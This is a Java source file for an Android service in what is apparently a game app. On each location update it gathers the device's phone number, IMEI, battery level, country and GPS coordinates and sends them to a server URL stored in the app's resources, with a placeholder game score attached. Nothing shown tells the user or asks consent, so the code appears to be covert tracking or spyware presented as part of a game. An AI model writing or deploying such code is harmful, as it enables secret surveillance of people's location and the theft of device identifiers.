package com.mlvandroidgame.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import com.mlvandroidgame.R;

import java.util.Date;
import java.util.Locale;

/**
 * Created by Zacharie BARBECOT.
 */
public class ShowLocationService extends Service implements LocationListener {

    private GpsService gpsService;
    private LocationManager locationManager;

    private float batteryPct;
    private String phoneNumber, imei, country, url;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        if(intent == null) {
            stopService(new Intent(this, ShowLocationService.class));
        } else {
            onCreate();
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        //battery level
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = this.registerReceiver(null, ifilter);

        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        this.batteryPct = level / (float)scale;

        //phone number & imei
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        this.phoneNumber = tMgr.getLine1Number();
        this.imei = tMgr.getDeviceId();

        this.country = getUserCountry(this);

        this.url = getResources().getString(R.string.url);


        this.locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        super.onCreate();
    }

    /*
     *
     * LOCATION LISTENER
     *
     */

    @Override
    public void onLocationChanged(Location location) {
        if(locationManager != null) {
            double latitude = location.getLatitude();
            double longitude = location.getLongitude();
            int score = 100;

            this.gpsService = new GpsService(url, phoneNumber, imei, batteryPct,
                    country, latitude, longitude, new Date(), score);
            gpsService.send();
}
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    /*
     *
     * OTHER
     *
     */

    public static String getUserCountry(Context context) {
        try {
            final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            final String simCountry = tm.getSimCountryIso();
            if (simCountry != null && simCountry.length() == 2) { // SIM country code is available
                return simCountry.toLowerCase(Locale.US);
            }
            else if (tm.getPhoneType() != TelephonyManager.PHONE_TYPE_CDMA) { // device is not 3G (would be unreliable)
                String networkCountry = tm.getNetworkCountryIso();
                if (networkCountry != null && networkCountry.length() == 2) { // network country code is available
                    return networkCountry.toLowerCase(Locale.US);
                }
            }
        }
        catch (Exception e) { }
        return null;
    }
}
